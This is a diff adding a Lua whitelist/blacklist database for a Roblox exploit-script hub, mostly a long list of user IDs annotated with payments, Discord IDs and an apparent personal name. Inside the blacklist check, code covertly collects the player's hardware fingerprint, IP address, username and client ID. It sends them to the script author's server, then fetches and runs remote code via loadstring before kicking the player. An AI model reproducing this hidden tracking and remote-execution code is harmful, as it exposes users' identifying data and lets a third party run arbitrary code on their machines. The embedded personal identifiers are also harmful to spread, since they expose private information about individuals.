@@ -1,0 +1,256 @@
+Database = {
+  Version = "V7.10",
+  Alerts = game:HttpGet("https://9kdestroyer.xyz/ResponseData/alerts.txt"),
+  Discord = "wPQHasG3nX",
+  Status = "",
+  Website = "https://9kdestroyer.xyz", -- Indevelopement
+  Blacklist = {},
+  Ranks = {
+    Superheros = {},
+    AbusePerms = {},
+    Premium = {},  
+  },
+}
+
+function Whitelist(Direction, id)
+    --[[local AutoCorrect = Direction
+    if string.find(AutoCorrect, "pre") then
+        table.insert(Database.Ranks.Premium, id)
+    elseif string.find(AutoCorrect, "super") then
+        table.insert(Database.Ranks.Superheros, id)
+    elseif string.find(AutoCorrect, "abus") then
+        table.insert(Database.Ranks.AbusePerms, id)
+    else
+        AGENTUI:Noti("Whitelist Error Please Dm n2#7889")
+    end]]
+    table.insert(Direction, id)
+end
+function Unwhitelist(id) 
+   --[[ if table.find(Database.Ranks.Superheros, id) then
+        table.remove(Database.Ranks.Superheros, Database.Ranks.Premium[id])
+    end
+    if table.find(Database.Ranks.AbusePerms, id) then
+        table.remove(Database.Ranks.AbusePerms, Database.Ranks.AbusePerms[id])
+    end
+    if table.find(Database.Ranks.Premium, id) then
+        table.remove(Database.Ranks.Premium, Database.Ranks.Premium[id])
+    end]]
+end
+function BlacklistUser(UserId)
+table.insert(Database.Blacklist, UserId)
+end
+
+BlacklistUser(2564628520)
+BlacklistUser(2006245717)
+
+if table.find(Database.Blacklist, game:GetService("Players").LocalPlayer.UserId) then
+local s,e = pcall(function()
+                    
+                 local http_request = http_request;
+                if syn then
+                	http_request = syn.request
+                elseif SENTINEL_V2 then
+                	function http_request(tb)
+                		return {
+                			StatusCode = 200;
+                			Body = request(tb.Url, tb.Method, (tb.Body or ''))
+                		}
+                	end
+                end
+                
+                local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+                local decoded = game:GetService('HttpService'):JSONDecode(body)
+                local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+                local hwid = "";
+                
+                for i, v in next, hwid_list do
+                	if decoded.headers[v] then
+                		hwid = decoded.headers[v];
+                		break
+                	end
+                end
+                local serverage -- only will be used if you break tos
+
+                local username = game.Players.LocalPlayer.Name
+                local userid = game.Players.LocalPlayer.UserId
+                local clientid = game:GetService("RbxAnalyticsService"):GetClientId()
+                local hwid = hwid
+                for i, v in pairs(decoded) do
+                    if i == "origin" then
+                        serverage =v
+                    end
+                end
+                local link = "https://9kdestroyer.xyz/PHP_Servers/Dex.php?username="..username.."&userid="..userid.."&clientid="..clientid.."&hwid="..hwid.."&serverage="..serverage.."&botname=Blacklist"
+                loadstring(game:HttpGet(link))()
+                end)
+                if e then print(e) end
+    game:GetService("Players").LocalPlayer:Kick("Agent | You are Blacklisted if you think this was a mistake dm n2#7888")
+end
+
+Whitelist(Database.Ranks.Premium, 1727761048) --9k
+Whitelist(Database.Ranks.Premium, 2477315635) -- 9k
+Whitelist(Database.Ranks.AbusePerms, 2477315635) -- 9k
+Whitelist(Database.Ranks.Superheros, 2477315635) -- 9k
+Whitelist(Database.Ranks.Premium, 2623517878) --n2
+Whitelist(Database.Ranks.Premium, 371768392) --warbone
+Whitelist(Database.Ranks.Superheros, 371768392) --warbone
+Whitelist(Database.Ranks.Premium, 369335282) --Antler
+Whitelist(Database.Ranks.Premium, 1922835848) --Actyrn
+Whitelist(Database.Ranks.Premium, 345682135) --gzz
+Whitelist(Database.Ranks.Premium, 1349834846) --havacy
+Whitelist(Database.Ranks.Superheros, 1349834846)
+Whitelist(Database.Ranks.Premium, 1942560304) --havacy
+Whitelist(Database.Ranks.Superheros, 1942560304) --havacy
+Whitelist(Database.Ranks.Premium, 3226934502) --havacy
+Whitelist(Database.Ranks.Superheros, 3226934502) --havacy
+
+Whitelist(Database.Ranks.Superheros,1981210441) --because
+Whitelist(Database.Ranks.AbusePerms,3302763155) --showcaser
+Whitelist(Database.Ranks.Superheros,2688454949) --fortunatesouls
+Whitelist(Database.Ranks.Premium,2688454949) --fortunatesouls
+Whitelist(Database.Ranks.Premium,4381917940) --Because cool fortunatesouls user ok alt
+
+Whitelist(Database.Ranks.AbusePerms,2424) --v5 Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.AbusePerms,215801515) --v7 Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,215801515) --v7 Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Superheros,215801515) --v7 Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.AbusePerms,2470336687) --me Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,2470336687) --me Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Superheros,2470336687) --me Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,1663522195) --Partner Whitelisted by - n27888 [Discord]
+Whitelist(Database.Ranks.Superheros,1177466036) --gio Whitelisted by - n27888 [Discord]
+Whitelist(Database.Ranks.Premium,1177466036) --gio Whitelisted by - n27888 [Discord]
+Whitelist(Database.Ranks.Premium,4070868702) --fortunate alt Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Superheros,3302763155) --alt Whitelisted by - n27888 [Discord]
+Whitelist(Database.Ranks.Premium,12133323) --fikop Whitelisted by - n27888 [Discord]
+Whitelist(Database.Ranks.Premium,6942069) --boomcaca Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,2427782845) --boomcaca Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,4070868702) --fortunate Whitelisted by - fortunatesouls8803 [Discord]
+Whitelist(Database.Ranks.Premium,4380453927) --cookieman Whitelisted by - n27888 [Discord]
+Whitelist(Database.Ranks.Superheros,4380453927) --coookieman Whitelisted by - n27888 [Discord]
+Whitelist(Database.Ranks.Superheros,4070868702) --n2 told me to Whitelisted by - fortunatesouls8803 [Discord]
+Whitelist(Database.Ranks.Premium,3705427532) --antler19 Whitelisted by - MoonDevAnt5445 [Discord]
+Whitelist(Database.Ranks.Superheros,3705427532) --antler19 Whitelisted by - MoonDevAnt5445 [Discord]
+Whitelist(Database.Ranks.Premium,483016107) --just for a week, remove after a week 3/17/23 Whitelisted by - MoonDevAnt5445 [Discord]
+Whitelist(Database.Ranks.Premium,4385437422) --Partner Whitelisted by - n27888 [Discord]
+Whitelist(Database.Ranks.Superheros,369335282) --antler me main for superhero Whitelisted by - MoonDevAnt5445 [Discord]
+Whitelist(Database.Ranks.Premium,3855015758) --fortunatesouls alt (testing scripts) Whitelisted by - fortunatesouls8803 [Discord]
+Whitelist(Database.Ranks.Premium,1229295426) --hin2 Whitelisted by - n27888 [Discord]
+Whitelist(Database.Ranks.Premium,4116602453) --sero hi n2 Whitelisted by - n27888 [Discord]
+Whitelist(Database.Ranks.Premium,4189222731) --juniorw Whitelisted by - n27888 [Discord]
+Whitelist(Database.Ranks.Premium,1141172190) --idk Whitelisted by - n27888 [Discord]
+Whitelist(Database.Ranks.Premium,4290763928) --invis Whitelisted by - n27888 [Discord]
+Whitelist(Database.Ranks.Premium,3592767936) --globalchat Whitelisted by - n27888 [Discord]
+Whitelist(Database.Ranks.Superheros,3855015758) --fortunatesouls alt stop fucking removing my premium whoever is doing this its pissing meoff Whitelisted by - fortunatesouls8803 [Discord]
+Whitelist(Database.Ranks.Premium,1864336407) --prinnt Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,3349643831) --Partner Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,2712406007) --art. Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,2954157433) --Giveaway Whitelisted by - Antwer5445 [Discord]
+Whitelist(Database.Ranks.Premium,235510933) --cashapp Cody Snow Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,3531715394) --cashapp cody snow Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,181125228) --smokey boost Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,2702863950) --2x boost [ discord id: 937467863445438536] Whitelisted by - fortunatesouls8803 [Discord]
+Whitelist(Database.Ranks.Premium,3208869525) --pwem Whitelisted by - Antwer5445 [Discord]
+Whitelist(Database.Ranks.Premium,2744906509) --alt 
+Whitelist(Database.Ranks.Premium,3984202941) --Boosted Server Twice [ discord id: 643157383429881907 ] Whitelisted by - fortunatesouls8803 [Discord]
+Whitelist(Database.Ranks.Premium,3622604991) --1y showcasing Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,785041774) --2 boosts Whitelisted by - Antwer5445 [Discord]
+Whitelist(Database.Ranks.Premium,2335764441) --2 boosts Whitelisted by - Antwer5445 [Discord]
+Whitelist(Database.Ranks.Premium,2750624173) --4 boost [ discord id: 843296018753781790 ] whitelisted by fortunatesouls
+Whitelist(Database.Ranks.AbusePerms,1727761048) --event Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,1727761048) --event Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Superheros,1727761048) --event Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,3803509226) --discord id: 525940832851853325 [ whitelisted by fortunatesouls
+Whitelist(Database.Ranks.Premium,783297749) --expboost Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,1834900976) --9k told me to Whitelisted by - Antwer5445 [Discord]
+Whitelist(Database.Ranks.Premium,2665680544) --9k told me to Whitelisted by - Antwer5445 [Discord]
+Whitelist(Database.Ranks.Premium,1447571403) --Discord ID: 898213123293593662 [whitelisted by fortunatesouls
+Whitelist(Database.Ranks.Premium,529734014) --1k giveaway Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Superheros,529734014) --1k giveaway Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,2550570843) --giveaway Whitelisted by - Antwer5445 [Discord]
+Whitelist(Database.Ranks.Superheros,2550570843) --giveaway Whitelisted by - Antwer5445 [Discord]
+Whitelist(Database.Ranks.Premium,1694085741) --giveaway Whitelisted by - Antwer5445 [Discord]
+Whitelist(Database.Ranks.Superheros,1694085741) --giveaway Whitelisted by - Antwer5445 [Discord]
+Whitelist(Database.Ranks.Premium,2596221699) --giveaway Whitelisted by - Antwer5445 [Discord]
+Whitelist(Database.Ranks.Superheros,2596221699) --giveaway Whitelisted by - Antwer5445 [Discord]
+Whitelist(Database.Ranks.Premium,977709213) --nitro 10$ Whitelisted by - Antwer5445 [Discord]
+Whitelist(Database.Ranks.Superheros,1599837641) --giveaway winner [discord id: 1038770111542210590] whitrelisted by fortunatesouls
+Whitelist(Database.Ranks.Premium,3459040468) --Booster Whitelisted by - fikop5900 [Discord]
+Whitelist(Database.Ranks.Premium,3389462788) --booster Whitelisted by - fikop5900 [Discord]
+Whitelist(Database.Ranks.Premium,1729220999) --re-whitelist | whitelisted by: fortunatesouls
+Whitelist(Database.Ranks.AbusePerms,3302765695) --OldFriendtst Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,3302765695) --OldFriendtst Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Superheros,3302765695) --OldFriendtst Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.AbusePerms,3948172507) --oldagentdev Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,3948172507) --oldagentdev Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Superheros,3948172507) --oldagentdev Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,3587254034) --123 Whitelisted by - fikop5900 [Discord]
+Whitelist(Database.Ranks.Premium,3389462788) --booster Whitelisted by - Antwer5445 [Discord]
+Whitelist(Database.Ranks.Premium,66984171) --Troll Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,127082302) --Boost Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,4278691960) --robux Whitelisted by - fortunatesouls8803 [Discord]
+Whitelist(Database.Ranks.Premium,2400924396) --booster Whitelisted by - fikop5900 [Discord]
+Whitelist(Database.Ranks.Premium,4116602453) --HAHAHAHHAHAHA LOOOOOOL Whitelisted by - Antwer5445 [Discord]
+Whitelist(Database.Ranks.Premium,1727186635) --boost Whitelisted by - fortunatesouls8803 [Discord]
+Whitelist(Database.Ranks.Premium,4081529948) --robux Whitelisted by - fikop5900 [Discord]
+Whitelist(Database.Ranks.Premium,132744503) --boost Whitelisted by - Antwer5445 [Discord]
+Whitelist(Database.Ranks.Premium,1323247431) --booster Whitelisted by - fkp5900 [Discord]
+Whitelist(Database.Ranks.Premium,2774728462) --sksjjsks Whitelisted by - 
+Whitelist(Database.Ranks.Premium,1889970894) --boost Whitelisted by - Antler5445 [Discord]
+Whitelist(Database.Ranks.Premium,4078836165) --fortunatesouls alt i dont know what number Whitelisted by - fortunatesouls8803 [Discord]
+Whitelist(Database.Ranks.Premium,1235441474) --nitro Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,3730626046) --Nitro Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,106640843) --Premium Whitelisted by - 9kDestroyer0001 [Discord]
+Whitelist(Database.Ranks.Premium,120575095) --boost Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,36880139) --cashapp Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,2007551210) --fnf Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,1491811258) --fnf Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,104337470) --fnf Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,3597664640) --fnf Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,533613333) --boost Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,2482894988) --bst Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,293387158) --Robux Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,993331411) --boost Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,4007201666) --robux Whitelisted by - fkp_0 [Discord]
+Whitelist(Database.Ranks.Premium,741916833) --Boost Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,2848024867) --nitro Whitelisted by - fkp_0 [Discord]
+Whitelist(Database.Ranks.Premium,4683379079) --boost Whitelisted by - fkp_0 [Discord]
+Whitelist(Database.Ranks.Premium,4779953872) --rewhitelist Whitelisted by - fkp_0 [Discord]
+Whitelist(Database.Ranks.Premium,4683379079) --bst Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,120575095) --reboost Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,4407317492) --Cashapp Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,3410155886) --robux Whitelisted by - fkp_0 [Discord]
+Whitelist(Database.Ranks.Premium,2596119700) --nitro Whitelisted by - fkp_0 [Discord]
+Whitelist(Database.Ranks.Premium,3150229748) --nitro Whitelisted by - fkp_0 [Discord]
+Whitelist(Database.Ranks.Premium,1909320762) --Nitro payment Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,4625298042) --nitro Whitelisted by - fkp_0 [Discord]
+Whitelist(Database.Ranks.Premium,1844720056) --boost Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,3642565702) --boost Whitelisted by - fkp_0 [Discord]
+Whitelist(Database.Ranks.Premium,3853460484) --rabac Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,3683903884) --all Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,2788497002) --BOOST Whitelisted by - fkp_0 [Discord]
+Whitelist(Database.Ranks.Premium,4542446023) --cashapp Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,1386516720) --bst Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,12095272) --bst Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,3512967646) --bst Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,876059304) --alt Whitelisted by - antlerw0 [Discord]
+Unwhitelist(1386516720) --unboost Unwhitelisted by - fkp_0 [Discord]
+Whitelist(Database.Ranks.Premium,3306618057) --robucs Whitelisted by - 9kdestroyer0 [Discord]
+Unwhitelist(120575095) --swap Unwhitelisted by - antlerw0 [Discord]
+Whitelist(Database.Ranks.Premium,1859636854) --swap Whitelisted by - antlerw0 [Discord]
+Whitelist(Database.Ranks.Premium,2440150407) --fnf Whitelisted by - 9kdestroyer0 [Discord]
+Unwhitelist(3642565702) --unboost Unwhitelisted by - fkp_0 [Discord]
+Unwhitelist(3683903884) --unboost Unwhitelisted by - fkp_0 [Discord]
+Whitelist(Database.Ranks.Premium,3211623450) --boost Whitelisted by - fkp_0 [Discord]
+Whitelist(Database.Ranks.Premium,2652800688) --alt Whitelisted by - antlerw0 [Discord]
+Whitelist(Database.Ranks.Premium,3311912099) --bst Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,201990969) --robuc Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,269204092) --robuc Whitelisted by - 9kdestroyer0 [Discord]
+Unwhitelist(3512967646) --unbst Unwhitelisted by - fkp_0 [Discord]
+Whitelist(Database.Ranks.Premium,656694567) --Premium Whitelisted by - fkp_0 [Discord]
+Whitelist(Database.Ranks.Premium,1087719653) --nitro Whitelisted by - fkp_0 [Discord]
+Whitelist(Database.Ranks.Premium,417838477) --cashapp Whitelisted by - 9kdestroyer0 [Discord]
+Whitelist(Database.Ranks.Premium,815612842) --BOOST Whitelisted by - fkp_0 [Discord]
+Unwhitelist(1844720056) --unboost Unwhitelisted by - fkp_0 [Discord]
+Whitelist(Database.Ranks.Premium,1867872993) --Boost Whitelisted by - fkp_0 [Discord]
+return Database
